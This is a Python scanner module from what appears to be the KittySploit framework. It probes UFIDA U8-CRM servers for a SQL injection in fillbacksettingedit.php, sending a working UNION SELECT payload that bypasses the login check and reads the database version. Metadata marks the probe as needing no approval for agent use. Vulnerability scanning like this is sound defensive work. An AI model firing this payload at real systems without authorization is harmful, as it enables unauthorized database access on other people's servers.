#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""UFIDA U8-CRM system /config/fillbacksetting."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'UFIDA U8 CRM cfillbacksetting.php - SQL Injection Detection',
        'description': 'UFIDA U8-CRM system /config/fillbacksetting.php contains an SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting in data leaks, tampering or destruction, and seriously threatening system security.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'yonyou', 'u8-crm', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-CRM%E7%B3%BB%E7%BB%9Ffillbacksetting.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'PHPSESSID=bgsesstimeout-;'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('src_obj_type":"businesInfo","src_fld', 'src_fld":null',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='UFIDA U8 CRM cfillbacksetting.php - SQL Injection detected', path=path)
            return True
        return False

